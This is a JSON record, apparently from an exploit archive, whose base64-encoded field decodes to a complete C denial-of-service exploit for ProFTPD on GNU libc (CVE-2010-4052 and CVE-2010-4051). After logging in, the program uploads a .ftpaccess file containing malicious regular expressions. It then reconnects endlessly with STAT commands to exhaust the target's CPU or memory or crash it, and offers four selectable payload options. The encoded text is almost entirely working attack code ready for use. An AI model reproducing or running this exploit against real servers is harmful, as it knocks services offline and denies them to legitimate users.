{
    "source": "exploit-database", 
    "exploit": "c291cmNlOiBodHRwOi8vd3d3LnNlY3VyaXR5Zm9jdXMuY29tL2JpZC80NTIzMy9pbmZvDQoNCkdOVSBnbGliYyBpcyBwcm9uZSB0byBhIGRlbmlhbC1vZi1zZXJ2aWNlIHZ1bG5lcmFiaWxpdHkgZHVlIHRvIHN0YWNrIGV4aGF1c3Rpb24uDQoNClN1Y2Nlc3NmdWwgZXhwbG9pdHMgd2lsbCBhbGxvdyBhdHRhY2tlcnMgdG8gbWFrZSB0aGUgYWZmZWN0ZWQgY29tcHV0ZXIgdW5yZXNwb25zaXZlLCBkZW55aW5nIHNlcnZpY2UgdG8gbGVnaXRpbWF0ZSB1c2Vycy4NCg0KVGhpcyBpc3N1ZSBhZmZlY3RzIHVua25vd24gdmVyc2lvbnMgb2YgdGhlIGdsaWJjIGxpYnJhcnkuIFRoaXMgQklEIHdpbGwgYmUgdXBkYXRlZCB3aGVuIG1vcmUgZGV0YWlscyBiZWNvbWUgYXZhaWxhYmxlLiANCg0KI2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8c3RkbGliLmg+DQojaW5jbHVkZSA8c3RyaW5nLmg+DQojaW5jbHVkZSA8c3lzL3R5cGVzLmg+DQojaW5jbHVkZSA8c3lzL3NvY2tldC5oPg0KI2luY2x1ZGUgPG5ldGluZXQvaW4uaD4NCiNpbmNsdWRlIDxuZXRkYi5oPg0KDQovKiANCg0KcHJvZnRwZCBtdWx0aXBsZSBleHBsb2l0IGZvciBWVSM5MTIyNzkgKG9ubHkgd2l0aCBHTlUgbGliYy9yZWdjb21wKDMpKQ0KYnkgTWFrc3ltaWxpYW4gQXJjaWVtb3dpY3oNCg0KUmVmZXJlbmNlczoNCmh0dHA6Ly93d3cua2IuY2VydC5vcmcvdnVscy9pZC85MTIyNzkNCmh0dHA6Ly9jeGliLm5ldC8NCmh0dHA6Ly9zZWN1cml0eXJlYXNvbi5jb20vDQoNClRlc3RlZDogDQpVYnVudHUgKyBwcm9mdHBkDQoNClRoaXMgZXhwbG9pdCBuZWVkIHdyaXRpbmcgcHJpdmlsZWdlcyB0byBjcmVhdGUgLmZ0cGFjY2VzcyBmaWxlIHdpdGggdnVsbmVyYWJsZSByZWd1bGFyIGV4cHJlc3Npb25zLiBXb3JrcyB3ZWxsIG9ubHkgdW5kZXIgTGludXgNCg0KMTcyLjE2LjEyNC4xIC0gTmV0QlNEIDUuMSAoSEFDS0VSKQ0KMTcyLjE2LjEyNC4xMzQgLSBVYnVudHUgMTAuMTAgKFRBUkdFVCkNCg0KUG9DMToNCi5leGl0Y3hAY3g2NDp+L2FkdnMvZG9uZSQgLi9yZWcxIDE3Mi4xNi4xMjQuMTM0IDIxIGN4IHBhc3N3b3JkIDE3Mi4xNi4xMjQuMSAxDQoNClRyeSBjcmVhdGUgLmZ0cGFjY2VzcyB3aXRoIEhpZGVGaWxlcyAiKFwuZnRwYWNjZXNzfCguKnsxMCx9ezEwLH17MTAsfXsxMCx9KSkkIg0KLi4uDQpzZW5kOiBzdGF0IC4NCg0Kc2VuZDogVVNFUiBjeA0KUEFTUyBwYXNzd29yZA0KDQpzZW5kOiBzdGF0IC4NCg0KQ2FuYHQgY29ubmVjdA0KLmV4aXQNCmN4QGN4NjQ6fi9hZHZzL2RvbmUkIHRlbG5ldCAxNzIuMTYuMTI0LjEzNCAyMQ0KVHJ5aW5nIDE3Mi4xNi4xMjQuMTM0Li4uDQp0ZWxuZXQ6IFVuYWJsZSB0byBjb25uZWN0IHRvIHJlbW90ZSBob3N0OiBDb25uZWN0aW9uIHJlZnVzZWQNCg0KUmVzdW1lOiANCi0gY3JlYXRlZCAuZnRwYWNjZXNzIGZpbGUsIGFuZCBjb25uZWN0PD0+ZGlzY29ubmVjdA0KSXQgd2lsbCBjcmVhdGUgYSBsb3Qgb2YgcHJvZnRwZCBjaGlsZHJlbiB3aXRoIDEwMCUgQ1BVIHVzYWdlLg0KDQoNCklmIHdlIHRyeQ0KDQouL3JlZzEgMTcyLjE2LjEyNC4xMzQgMjEgY3ggcGFzc3dvcmQgMTcyLjE2LjEyNC4xIDMNCg0KYW55IHByb2Z0cGQgY2hpbGRyZW4gd2lsbCBnZW5lcmF0ZSBtZW1vcnkgZXhoYXVzaW9uDQoNCk9wdGlvbnM6DQoxIC0gY3B1IHJlc291cmNlIGV4aGF1c2lvbg0KMiAtIGNyYXNoIChyZWN1cnNpb24pDQozIC0gbWVtb3J5IHJlc291cmNlIGV4aGF1c2lvbg0KNCAtIHBvc3NpYmxlIGNyYXNoIHdpdGggKHVsaW1pdCB7LXZ8LW19KQ0KDQoqLw0KDQoNCmNoYXIgZXhwbDBbXT0iSGlkZUZpbGVzIFwiKFxcLmZ0cGFjY2Vzc3woLip7MTAsfXsxMCx9ezEwLH17MTAsfSkpJFwiIjsgIC8vQ1ZFLTIwMTAtNDA1MiBMb25nIGV4ZWN1dGlvbg0KY2hhciBleHBsMVtdPSJIaWRlRmlsZXMgXCIoXFwuZnRwYWNjZXNzfCguKnsxMCx9ezEwLH17MTAsfXsxMCx9ezEwLH0pKSRcIiI7IC8vQ1ZFLTIwMTAtNDA1MSBDcmFzaA0KY2hhciBleHBsMltdPSJIaWRlRmlsZXMgXCIoLiorKysrKysrKysrKysrKysrKysrKysrKysrKysrKyhcXHcrKSlcIiI7IC8vIG1lbW9yeSBleGhhdXNpb24NCmNoYXIgZXhwbDNbXT0iSGlkZUZpbGVzIFwiKC4qKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKFxcdyspKVwiIjsgLy8gaWYgdmlydHVhbCBtZW1vcnkgbGltaXRlZCwgY3Jhc2gNCg0KaW50IHNlbmRmdHAoaW50IHN0cmVhbSxjaGFyICp3aGF0KXsNCiAgICAgICAgaWYoLTE9PXNlbmQoc3RyZWFtLHdoYXQsc3RybGVuKHdoYXQpLDApKQ0KICAgICAgICAgICAgICAgIHByaW50ZigiQ2FuJ3Qgc2VuZCAlc1xuIix3aGF0KTsNCiAgICAgICAgZWxzZQ0KICAgICAgICAgICAgICAgIHByaW50Zigic2VuZDogJXNcbiIsd2hhdCk7DQoNCiAgICAgICAgYnplcm8od2hhdCxzaXplb2Yod2hhdCkpOw0KfQ0KDQp2b2lkIHJlYWRmdHAoaW50IHN0cmVhbSxpbnQgZmxhZyl7DQoJaWYoZmxhZz09MSkgZmxhZz1NU0dfRE9OVFdBSVQ7DQoJZWxzZSBmbGFnPTA7DQogICAgICAgIGNoYXIgKnJlYWRsaW5lPW1hbGxvYyhzaXplb2YoY2hhcikqKDQwOTYrMSkpOw0KCW1lbXNldChyZWFkbGluZSwnXHgwMCcsKDQwOTYrMSkpOw0KICAgICAgICBpZihyZWN2KHN0cmVhbSxyZWFkbGluZSw0MDk2LGZsYWcpPDEpew0KICAgICAgICAgICAgICAgIHByaW50ZigiQ2FuJ3QgcmVhZCBmcm9tIHN0cmVhbVxuIik7DQoJCWlmKHJlYWRsaW5lKSBmcmVlKHJlYWRsaW5lKTsNCgkJY2xvc2Uoc3RyZWFtKTsNCgkJZXhpdCgxKTsNCgl9DQoJZWxzZXsNCgkJaWYocmVhZGxpbmUpDQoJCQl3cml0ZSgxLCByZWFkbGluZSwgc3RybGVuKHJlYWRsaW5lKSk7DQoJCWZmbHVzaChzdGRvdXQpOw0KCX0NCglmcmVlKHJlYWRsaW5lKTsNCn0NCg0KDQppbnQgYXR0YWNrKGhvc3QscG9ydCxsb2dpbixwYXNzKQ0KY2hhciAqaG9zdCwqcG9ydCwqbG9naW4sKnBhc3M7DQp7DQoJY2hhciBidWZmZXJbMTAyNF07IC8vIHNlbmQgZnRwIGNvbW1hbmQgYnVmZm9yDQoJaW50IHNvY2tmZCxuLGVycm9yOw0KCXN0cnVjdCBhZGRyaW5mbyBoaW50czsNCglzdHJ1Y3QgYWRkcmluZm8gKnJlcywgKnJlczA7DQoNCgltZW1zZXQoJmhpbnRzLCAwLCBzaXplb2YoaGludHMpKTsNCgloaW50cy5haV9mYW1pbHkgPSBQRl9VTlNQRUM7DQoJaGludHMuYWlfc29ja3R5cGUgPSBTT0NLX1NUUkVBTTsNCgllcnJvciA9IGdldGFkZHJpbmZvKGhvc3QscG9ydCwmaGludHMsJnJlczApOw0KDQoJaWYgKGVycm9yKXsNCgkJZXJyb3Jjb246DQoJCXByaW50ZigiQ2FuYHQgY29ubmVjdFxuLmV4aXQiKTsNCgkJZXhpdCgxKTsNCgl9DQoNCglpZigoc29ja2ZkPXNvY2tldChyZXMwLT5haV9mYW1pbHkscmVzMC0+YWlfc29ja3R5cGUscmVzMC0+YWlfcHJvdG9jb2wpKTwwKSBnb3RvIGVycm9yY29uOw0KCWlmKC0xPT1jb25uZWN0KHNvY2tmZCxyZXMwLT5haV9hZGRyLHJlczAtPmFpX2FkZHJsZW4pKSBnb3RvIGVycm9yY29uOw0KDQoJc25wcmludGYoYnVmZmVyLDEwMjQsIlVTRVIgJXNcblBBU1MgJXNcbiIsbG9naW4scGFzcyk7DQoJc2VuZGZ0cChzb2NrZmQsYnVmZmVyKTsNCg0KCWJ6ZXJvKGJ1ZmZlciwxMDI0KTsNCglzbnByaW50ZihidWZmZXIsMTAyNCwiU1RBVCAuXG4iKTsNCglzZW5kZnRwKHNvY2tmZCxidWZmZXIpOw0KCQ0KCWZyZWVhZGRyaW5mbyhyZXMwKTsNCgljbG9zZShzb2NrZmQpOw0KfQ0KDQp2b2lkIGV4cGxvcmVpcChjaGFyICppcCwgaW50ICgqaXBudW0pWzRdKXsNCgljaGFyICp3c2s7DQoJDQoJd3NrPShjaGFyICopc3RydG9rKGlwLCIuIik7DQoJKCppcG51bSlbMF09YXRvaSh3c2spOw0KCXdzaz0oY2hhciAqKXN0cnRvayhOVUxMLCIuIik7DQoJKCppcG51bSlbMV09YXRvaSh3c2spOw0KCXdzaz0oY2hhciAqKXN0cnRvayhOVUxMLCIuIik7DQoJKCppcG51bSlbMl09YXRvaSh3c2spOw0KCXdzaz0oY2hhciAqKXN0cnRvayhOVUxMLCIuIik7DQoJKCppcG51bSlbM109YXRvaSh3c2spOw0KfQ0KDQoNCmludCBjcmVhdGVleHBsKGhvc3QscG9ydCxsb2dpbixwYXNzLGxpcCxwYXR0ZXJuKQ0KICAgICAgICBjaGFyICpob3N0LCpwb3J0LCpsb2dpbiwqcGFzcywqbGlwLCpwYXR0ZXJuOw0Kew0KICAgICAgICBjaGFyIGJ1ZmZlclsxMDI0XTsgLy8gc2VuZCBmdHAgY29tbWFuZCBidWZmb3INCiAgICAgICAgaW50IGlwbnVtWzRdOw0KDQogICAgICAgIGludCBzb2NrZmQsbixlcnJvcixzZW5kc3RyZWFtLGJpbmFyeXN0cmVhbSxzZW5kcG9ydCA9ICgxMDI0ICsgZ2V0cGlkKCkpOw0KDQoJc3RydWN0IGFkZHJpbmZvIGhpbnRzOw0KCXN0cnVjdCBhZGRyaW5mbyAqcmVzLCAqcmVzMDsNCglzdHJ1Y3Qgc29ja2FkZHJfaW4gcmVtbywgbG9jYTsNCg0KCWludCBsZW4gPSBzaXplb2YocmVtbyk7DQoJDQogICAgICAgIG1lbXNldCgmaGludHMsIDAsIHNpemVvZihoaW50cykpOw0KICAgICAgICBoaW50cy5haV9mYW1pbHkgPSBQRl9VTlNQRUM7DQogICAgICAgIGhpbnRzLmFpX3NvY2t0eXBlID0gU09DS19TVFJFQU07DQogICAgICAgIGVycm9yID0gZ2V0YWRkcmluZm8oaG9zdCxwb3J0LCZoaW50cywmcmVzMCk7DQoNCiAgICAgICAgaWYgKGVycm9yKXsNCiAgICAgICAgICAgICAgICBlcnJvcmNvbjoNCgkJDQoJCWlmKHNlbmRzdHJlYW0pIGNsb3NlKHNlbmRzdHJlYW0pOw0KCQlwcmludGYoIkNhbmB0IGNvbm5lY3Rcbi5leGl0Iik7DQogICAgICAgICAgICAgICAgZXhpdCgxKTsNCiAgICAgICAgfQ0KDQogICAgICAgIGlmKChzb2NrZmQ9c29ja2V0KHJlczAtPmFpX2ZhbWlseSxyZXMwLT5haV9zb2NrdHlwZSwgcmVzMC0+YWlfcHJvdG9jb2wpKTwwKSAgICAgZ290byBlcnJvcmNvbjsNCiAgICAgICAgaWYoLTE9PWNvbm5lY3Qoc29ja2ZkLHJlczAtPmFpX2FkZHIscmVzMC0+YWlfYWRkcmxlbikpIGdvdG8gZXJyb3Jjb247DQoNCiAgICAgICAgcmVhZGZ0cChzb2NrZmQsMTAyNCk7DQogICAgICAgIHNucHJpbnRmKGJ1ZmZlciwxMDI0LCJVU0VSICVzXG5QQVNTICVzXG4iLGxvZ2luLHBhc3MpOw0KICAgICAgICBzZW5kZnRwKHNvY2tmZCxidWZmZXIpOw0KICAgICAgICByZWFkZnRwKHNvY2tmZCwxMDI0KTsNCglyZWFkZnRwKHNvY2tmZCwxMDI0KTsNCg0KCWV4cGxvcmVpcChsaXAsJmlwbnVtKTsNCiAgICAgICAgc25wcmludGYoYnVmZmVyLDEwMjQsIlRZUEUgSVxuUE9SVCAlZCwlZCwlZCwlZCwlZCwlZFxuIixpcG51bVswXSxpcG51bVsxXSxpcG51bVsyXSxpcG51bVszXSxzZW5kcG9ydC8yNTYsc2VuZHBvcnQlMjU2KTsNCiAgICAgICAgc2VuZGZ0cChzb2NrZmQsYnVmZmVyKTsNCiAgICAgICAgcmVhZGZ0cChzb2NrZmQsMTAyNCk7DQoJDQoJYnplcm8oJmxvY2EsIHNpemVvZihsb2NhKSk7DQoJbG9jYS5zaW5fZmFtaWx5ID0gQUZfSU5FVDsNCglsb2NhLnNpbl9wb3J0PWh0b25zKHNlbmRwb3J0KTsNCglsb2NhLnNpbl9hZGRyLnNfYWRkciA9IGh0b25sKElOQUREUl9BTlkpOw0KDQoJaWYoKHNlbmRzdHJlYW09c29ja2V0KEFGX0lORVQsIFNPQ0tfU1RSRUFNLDApKTwwKSBnb3RvIGVycm9yY29uOw0KCWlmKChiaW5kKHNlbmRzdHJlYW0sIChzdHJ1Y3Qgc29ja2FkZHIgKikgJmxvY2EsIHNpemVvZihsb2NhKSkpPDApIGdvdG8gZXJyb3Jjb247DQoJaWYobGlzdGVuKHNlbmRzdHJlYW0sIDEwKSA8IDApIGdvdG8gZXJyb3Jjb247DQoNCglzbnByaW50ZihidWZmZXIsMTAyNCwiU1RPUiAuZnRwYWNjZXNzXG4iKTsNCiAgICAgICAgc2VuZGZ0cChzb2NrZmQsYnVmZmVyKTsNCgkNCiAgICAgICAgcmVhZGZ0cChzb2NrZmQsMTAyNCk7DQoNCglpZigoYmluYXJ5c3RyZWFtPWFjY2VwdChzZW5kc3RyZWFtLChzdHJ1Y3Qgc29ja2FkZHIgKikmcmVtbywmbGVuKSkgPCAwKSBnb3RvIGVycm9yY29uOw0KCXdyaXRlKGJpbmFyeXN0cmVhbSxwYXR0ZXJuLHN0cmxlbihwYXR0ZXJuKSk7DQoJDQoJZnJlZWFkZHJpbmZvKHJlczApOw0KCWNsb3NlKHNlbmRzdHJlYW0pOw0KCXByaW50ZigiQ3JlYXRlZCAuZnRwYWNjZXNzIGZpbGUgd2l0aCAlc1xuSXRgcyB0aW1lIHRvIGF0dGFjay4uLlxuIixwYXR0ZXJuKTsNCglzbGVlcCgzKTsNCgkNCglyZXR1cm4gMDsNCn0NCg0Kdm9pZCB1c2FnZSgpew0KCXByaW50ZigiVXNlOiAuL2V4cGxvaXQgdGFyZ2V0X2lwIHBvcnQgdXNlcm5hbWUgcGFzc3dvcmQgW3lvdXJfaXBdIFtvcHRpb25dXG5cbkNyZWF0ZSAuZnRwYWNjZXNzIHdpdGggc2VsZWN0ZWQgYXR0YWNrXG5vcHRpb25zOlxuMSAtIExvbmcgZXhlY3V0aW9uIENWRS0yMDEwLTQwNTJcbjIgLSBSZWN1cnNpb24gQ3Jhc2ggQ1ZFLTIwMTAtNDA1MVxuMyAtIE1lbW9yeSBleGhhdXNpb24gXG40IC0gQ3Jhc2ggaWYgdmlydHVhbCBtZW1vcnkgbGltaXRlZFxuXG4iKTsNCglleGl0KDEpOw0KfQ0KDQppbnQgbWFpbihpbnQgYXJnYyxjaGFyICphcmd2W10pDQp7DQoNCiAgICAgICAgY2hhciAqbG9naW4sKnBhc3MsKmxpcD1OVUxMOw0KICAgICAgICBjaGFyIGxvZ2luZGVmW109ImFub255bW91cyIscGFzc2RlZltdPSJjeEAxMjcuMC4wLjEiOw0KDQogICAgICAgIHByaW50ZigiVGhpcyBpcyBleHBsb2l0IGZvciBFUkUgKEdOVSBsaWJjKVxuYnkgTWFrc3ltaWxpYW4gQXJjaWVtb3dpY3pcblxuIik7DQoNCiAgICAgICAgaWYoYXJnYzwzKSB1c2FnZSgpOw0KDQogICAgICAgIGNoYXIgKmhvc3Q9YXJndlsxXTsNCiAgICAgICAgY2hhciAqcG9ydD1hcmd2WzJdOw0KDQogICAgICAgIGlmKDQ8PWFyZ2MpIGxvZ2luPWFyZ3ZbM107DQogICAgICAgIGVsc2UgbG9naW49bG9naW5kZWY7DQoNCiAgICAgICAgaWYoNTw9YXJnYykgcGFzcz1hcmd2WzRdOw0KICAgICAgICBlbHNlIHBhc3M9cGFzc2RlZjsNCg0KCWlmKDY8PWFyZ2MpIGxpcD1hcmd2WzVdOw0KCQ0KCWlmKDc8PWFyZ2MpIHN3aXRjaChhdG9pKGFyZ3ZbNl0pKXsNCgkJY2FzZSAxOg0KCQkJcHJpbnRmKCJUcnkgY3JlYXRlIC5mdHBhY2Nlc3Mgd2l0aCAlc1xuXG4iLGV4cGwwKTsgDQoJCQljcmVhdGVleHBsKGhvc3QscG9ydCxsb2dpbixwYXNzLGxpcCxleHBsMCk7DQoJCWJyZWFrOw0KCQkNCgkJY2FzZSAyOg0KCQkJcHJpbnRmKCJUcnkgY3JlYXRlIC5mdHBhY2Nlc3Mgd2l0aCAlc1xuXG4iLGV4cGwxKTsNCgkJCWNyZWF0ZWV4cGwoaG9zdCxwb3J0LGxvZ2luLHBhc3MsbGlwLGV4cGwxKTsNCgkJYnJlYWs7DQoJCQ0KCQljYXNlIDM6DQoJCQlwcmludGYoIlRyeSBjcmVhdGUgLmZ0cGFjY2VzcyB3aXRoICVzXG5cbiIsZXhwbDIpOw0KCQkJY3JlYXRlZXhwbChob3N0LHBvcnQsbG9naW4scGFzcyxsaXAsZXhwbDIpOw0KCQlicmVhazsNCgkJDQoJCWNhc2UgNDoNCgkJCXByaW50ZigiVHJ5IGNyZWF0ZSAuZnRwYWNjZXNzIHdpdGggJXNcblxuIixleHBsMyk7DQoJCQljcmVhdGVleHBsKGhvc3QscG9ydCxsb2dpbixwYXNzLGxpcCxleHBsMyk7DQoJCWJyZWFrOw0KCQkNCgkJZGVmYXVsdDoNCgkJCXVzYWdlKCk7DQoJCWJyZWFrOw0KCX07DQoNCgl3aGlsZSgxKSBhdHRhY2soaG9zdCxwb3J0LGxvZ2luLHBhc3MpOw0KCQ0KICAgICAgICByZXR1cm4gMDsgLy8gbmV2ZXIgaGFwcGVuDQp9", 
    "filename": "platforms/linux/dos/35061.c", 
    "id": "35061", 
    "cves": [
        "CVE-2010-4052", 
        "CVE-2010-4051"
    ]
}